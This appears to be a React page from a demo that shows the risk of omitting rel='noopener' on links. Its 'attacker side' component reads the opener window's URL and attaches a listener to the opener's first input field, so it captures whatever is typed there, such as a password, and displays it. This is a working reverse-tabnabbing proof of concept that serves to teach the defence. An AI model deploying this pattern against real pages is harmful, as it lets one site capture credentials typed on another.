import * as React from 'react'
import { TextArea, Header } from 'semantic-ui-react'
import Layout from '../components/Layout'

const title = 'noopener検証(攻撃側)'
const NoOpenerAttacker = () => {
  const [source, setSource] = React.useState<string>('')
  const [password, setPassword] = React.useState<string>('')

  React.useEffect(() => {
    const source = window.opener?.location.href

    setSource(source || 'noopener設定あり')
    if (!source) return
    window.opener.document
      .getElementsByTagName('input')[0]
      .addEventListener('input', (e: React.ChangeEvent<HTMLInputElement>) =>
        setPassword(e.target.value)
      )
  }, [])

  return (
    <Layout title={title}>
      <Header as="h1">{title}</Header>
      <p>このデモ以外でここのURLに直接リンクするのは控えてください。</p>
      <p>以下の操作をしています。</p>
      <ul>
        <li>opener Form の書き換え</li>
        <li>opener の Form Event の追加</li>
        <li>opener の Form の傍受</li>
      </ul>
      <p>アクセス元: {source}</p>
      <p>フォーム内容:</p>
      <TextArea value={password} />
    </Layout>
  )
}

export default NoOpenerAttacker
